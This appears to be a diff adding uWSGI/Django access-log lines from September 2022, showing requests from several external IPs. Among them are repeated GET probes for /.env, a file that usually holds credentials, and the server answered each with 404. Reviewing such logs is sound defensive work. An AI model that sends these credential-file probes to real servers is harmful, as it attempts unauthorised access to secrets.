+[pid: 6|app: 0|req: 95/95] 128.14.134.134 () {34 vars in 478 bytes} [Thu Sep 29 08:15:51 2022] GET / => generated 12989 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 217 bytes (1 switches on core 0)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 96/96] 135.125.246.110 () {40 vars in 622 bytes} [Thu Sep 29 08:23:43 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 6|app: 0|req: 97/97] 135.125.246.110 () {36 vars in 515 bytes} [Thu Sep 29 08:23:43 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 6|app: 0|req: 98/98] 128.199.151.134 () {34 vars in 385 bytes} [Thu Sep 29 08:39:30 2022] GET / => generated 12989 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 217 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 6|app: 0|req: 99/99] 185.254.196.115 () {36 vars in 515 bytes} [Thu Sep 29 10:31:29 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 100/100] 185.254.196.115 () {40 vars in 622 bytes} [Thu Sep 29 10:31:29 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 1)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 101/101] 135.125.246.110 () {40 vars in 622 bytes} [Thu Sep 29 10:43:25 2022] POST / => generated 41 bytes in 37 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 6|app: 0|req: 102/102] 135.125.246.110 () {36 vars in 515 bytes} [Thu Sep 29 10:43:25 2022] GET /.env => generated 2314 bytes in 6 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
